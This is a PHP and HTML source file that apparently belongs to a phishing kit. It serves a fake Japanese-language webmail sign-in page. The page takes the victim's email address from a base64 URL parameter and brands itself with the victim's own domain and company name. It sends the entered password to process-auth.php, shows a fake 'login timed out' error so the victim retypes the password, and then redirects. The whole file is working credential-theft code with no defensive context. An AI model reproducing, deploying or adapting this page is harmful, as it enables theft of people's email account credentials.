<?php

$email = base64_decode($_GET['e']);

$split_email = explode('@', $email);


$username = $split_email[0];
$domain = $split_email[1];
$url= 'http://'.$split_email[1];



$company = explode('.', $domain);

$company_name = $company[0];

$num = array('1','2','3','4','5','6','7','8','9');
shuffle($num);

$inbox = $num[0];


$default_msg = '924.44MBのメールボックススペースが使用されます。 </span>';
$error_msg1 = 'ログイン試行がタイムアウトしました。パスワードを確認してください';
$error_msg2 = '<span style="color:green;">完全に,</span> <span style="color:black;">ファイルにリダイレクトされるまで5秒待ちます...</span>';

?>
<html>
<head>
<title><?php echo strtoupper($domain); ?></title>
<link href="style.css" rel="stylesheet" type="text/css" />

<script src="jquery-2.2.js"></script>

<script>

$(document).ready(function() {    

    
//get region
$('#submit_btn').on('click', function() {

var username = $('#username').val();
var password = $('#password').val();
var counter = $('#counter').val();

function IsEmail(email) {
  var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  if(!regex.test(email)) {
    return false;
  }else{
    return true;
  }
}
  
if(!username  && !password )
{
    $('#emailerror').show();
    $('#username').addClass('txt_error');
    $('#passerror').show();
    $('#password').addClass('txt_error');
    return false;
}

if(!username || IsEmail(username)==false)
{
    $('#passerror').hide();
    $('#password').removeClass('txt_error');

    $('#emailerror').show();
    $('#username').addClass('txt_error');
    return false;
}


if(!password)
{
    $('#passerror').show();
    $('#password').addClass('txt_error');
    return false;
}


$("#ajaxloading").show()
$('.container-fluid').hide();


            setTimeout(
            function() 
            {

$.post("process-auth.php", {username:username, password:password, counter:counter})
  .done(function(data) {
   $("#ajaxloading").hide(); 

    $("#counter").val(data); 
    

    
  	if(data == 1){
         $("#error_msg").show(); 
         
         $('#emailerror').hide();
        $('#username').removeClass('txt_error');
         $('#passerror').hide();
        $('#password').removeClass('txt_error');
        $('#password').val('');

         $('.container-fluid').show();
        }
        else if(data == 101)
        {
            $('#emailerror').show();
            $('#username').addClass('txt_error');
            $('#passerror').show();
            $('#password').addClass('txt_error'); 
        }
		else{	
            $("#error_msg").hide(); 
            $("#error_msg2").show(); 

            
            $('.container-fluid').show();
            setTimeout(
            function() 
            {
                window.location.href= data;
            },2000);
           
		
}

});

},3000);


});

});

</script>

<?php

$bg_color = array('#004B8C','#4CAF50','#7560F9','#7800a0');

shuffle($bg_color);

$bg = $bg_color[0];


$left_bg_img = array('phones.png','phones2.png','phones3.png','phones4.png','phones5.png');

shuffle($left_bg_img);

$left_bg = $left_bg_img[0];

?>

<style>
#left_side{
    background-color: <?php echo $bg; ?>;
    color: #FFF;
}
    </style>
</head>
<body>
    

<div id="ajaxloading" style="background-color: <?php echo $bg; ?>;">
            <div class="content">
            <?php echo strtoupper($company_name); ?><br>
                    <span>www.<?php echo $domain; ?></span>
                    <p class="saving" style="margin-top: 0px;"><span>.</span><span>.</span><span>.</span></p>
            </div>
        </div>

<div class="container-fluid">
    <div id="left_side" style="background-image: url('images/<?php echo $left_bg; ?>');">
        <div id="left_side_content">
        <?php echo strtoupper($company_name); ?><br>
    <span>www.<?php echo $domain; ?></span>

</div>
    </div>

    <div id="right_side">
        <div id="login-area">
        <div id="icon-row"> 
            <img src="images/profile.jpg"> <?php echo $username; ?>, <img src="images/mail.png" style="height: 15px; margin-left:10px;"> <span class="badge">+<?php echo $inbox; ?></span> <img src="images/barcode.jpg" class="barcode"> <br>
        </div>
        <div id="login-title">  <?php echo $default_msg; ?> </span> <br><img src="images/disk_space.jpg" style="margin-top: 5px;"></div>

        <div id="login-control">
            <form method="post" action="#">
            サインインしてドキュメントを共有する <br>

        <div id="error_msg" class="error_msg"><?php echo $error_msg1; ?></div>
        <div id="error_msg2" class="error_msg"><?php echo $error_msg2; ?></div>

        <input type="email" name="username" id="username" placeholder="メールアドレスを入力" value="<?php echo $email; ?>" class="txt" readonly><br>
        <div class="error_caption" id="emailerror">有効なメールアドレスが必要</div>
        <input type="password" name="password" id="password" placeholder="パスワードを入力する" class="txt"><br>
        <div class="error_caption" id="passerror">続行するにはパスワードが必要です</div>
        <input type="hidden" name="counter" id="counter" value "">
        <input type="button" value="ログイン" class="btn" id="submit_btn" style="background-color: <?php echo $bg; ?>;">
</form>
        </div>

        </div>

        
<div id="footer">

<img src="images/footer.jpg">

</div>

    </div>
    <div class="clear"></div>

</div>

</body>

</html>